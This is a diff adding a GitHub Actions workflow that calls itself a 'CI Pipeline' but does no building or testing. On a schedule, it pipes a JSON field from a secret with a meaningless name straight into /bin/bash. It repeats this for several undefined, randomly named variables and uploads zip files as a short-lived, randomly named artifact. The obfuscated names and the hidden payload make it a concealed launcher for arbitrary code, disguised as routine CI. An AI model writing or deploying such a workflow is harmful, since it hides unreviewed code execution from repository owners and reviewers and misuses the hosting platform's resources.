@@ -1,0 +1,33 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '32 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          qw0: ${{ secrets.qw0 }}
+        run: |
+          printf '%s' "$qw0" | jq -r .vkx49 | /bin/bash
+          printf '%s' "$v4836" | jq -r .r633 | /bin/bash
+          printf '%s' "$ny49673" | jq -r .u5 | /bin/bash
+          printf '%s' "$m984" | jq -r .q618 | /bin/bash
+          printf '%s' "$hhk6" | jq -r .aqqn970 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: rOboibSd
+          path: "*.zip"
+          retention-days: 1
